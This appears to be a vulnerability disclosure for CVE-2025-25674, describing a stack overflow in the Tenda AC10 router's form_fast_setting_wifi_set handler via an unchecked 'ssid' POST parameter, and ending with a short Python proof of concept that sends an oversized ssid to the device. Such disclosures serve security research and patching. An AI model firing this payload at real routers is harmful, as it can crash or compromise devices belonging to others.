# CVE-2025-25674

## **Overview**

Firmware download website: https://www.tenda.com.cn/material/show/102734

## **Vulnerability details**

The Tenda **AC10 V1.0V15.03.06.23** has a stack overflow vulnerability located in the form_fast_setting_wifi_set function.The ssid variable receives the ssid parameter from a POST request and is later assigned to the s and dest variable. However, since the user has control over the input of ssid, the statement strcpy(ssid_24g, ssid); and strcpy(ssid_5g, ssid); leads to a buffer overflow. There is no size check, so the user-provided ssid can exceed the allocated size of the s array and dest array, thus triggering this security vulnerability. The attacker can easily perform a Deny of Service Attack or Remote Code Execution with carefully crafted overflow data. 

![img](https://cdn.nlark.com/yuque/0/2025/png/34322964/1737798643488-b37eeb4a-d850-412d-a8d8-3e68948336c1.png)

## **PoC**

```python
import requests 
ip ='192.168.0.100:80' 
url =f"http://{ip}/goform/fast_setting_wifi_set" 
data ={"ssid":'a'*0x100} 
ret = requests.post(url, data)
```